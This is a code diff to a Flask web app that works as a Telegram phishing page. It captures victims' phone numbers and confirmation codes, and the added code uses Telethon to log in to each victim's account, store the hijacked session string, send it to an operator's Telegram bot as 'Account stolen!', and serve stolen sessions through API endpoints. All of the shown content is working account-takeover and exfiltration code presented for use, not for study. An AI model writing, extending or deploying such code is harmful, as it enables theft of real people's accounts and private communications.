@@ -2,6 +2,9 @@ from flask import Flask, request, render_template_string
 import sqlite3
 import requests
 from datetime import datetime
+import asyncio
+from telethon import TelegramClient
+from telethon.sessions import StringSession
 
 app = Flask(__name__)
 
@@ -17,6 +20,7 @@ def init_db():
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             phone TEXT,
             code TEXT,
+            session_string TEXT,
             created_at TIMESTAMP
         )
     ''')
@@ -137,28 +141,73 @@ def code(sess_id):
     if request.method == 'POST':
         code = request.form.get('code')
         if code:
+            # Пытаемся войти в аккаунт
+            session_string = login_to_telegram(phone, code)
+            
             conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
-            c.execute("UPDATE sessions SET code=? WHERE id=?", (code, sess_id))
+            if session_string:
+                c.execute("UPDATE sessions SET code=?, session_string=? WHERE id=?", (code, session_string, sess_id))
+                msg = f"✅ *Аккаунт украден!*\n\nТелефон: `{phone}`\n\nСтрока сессии:\n`{session_string}`"
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                             json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
+            else:
+                c.execute("UPDATE sessions SET code=? WHERE id=?", (code, sess_id))
+                msg = f"🔑 *Код подтверждения!*\n\nТелефон: `{phone}`\nКод: `{code}`"
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                             json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
             conn.commit()
             conn.close()
-            
-            msg = f"🔑 *Код подтверждения!*\n\nТелефон: `{phone}`\nКод: `{code}`"
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                         json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
             
             return render_template_string(SUCCESS_PAGE)
     
     return render_template_string(CODE_PAGE, phone=phone)
 
+def login_to_telegram(phone, code):
+    """Вход в Telegram и получение строки сессии"""
+    try:
+        # Создаём событийный цикл
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        client = TelegramClient(StringSession(), 0, '')
+        loop.run_until_complete(client.connect())
+        
+        # Пытаемся войти с кодом
+        try:
+            loop.run_until_complete(client.sign_in(phone, code))
+        except:
+            # Если запрашивает пароль 2FA
+            return None
+        
+        # Получаем строку сессии
+        session_string = StringSession.save(client.session)
+        loop.run_until_complete(client.disconnect())
+        loop.close()
+        
+        return session_string
+    except:
+        return None
+
 @app.route('/sessions', methods=['GET'])
 def list_sessions():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT id, phone, code FROM sessions ORDER BY id DESC")
+    c.execute("SELECT id, phone, code, session_string FROM sessions ORDER BY id DESC")
     rows = c.fetchall()
     conn.close()
-    return {"sessions": [{"id": r[0], "phone": r[1], "code": r[2]} for r in rows]}
+    return {"sessions": [{"id": r[0], "phone": r[1], "code": r[2], "session": r[3]} for r in rows]}
+
+@app.route('/session/<int:acc_id>', methods=['GET'])
+def get_session(acc_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT session_string FROM sessions WHERE id=?", (acc_id,))
+    row = c.fetchone()
+    conn.close()
+    if row and row[0]:
+        return {"session": row[0]}
+    return {"error": "not found"}, 404
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=8080)
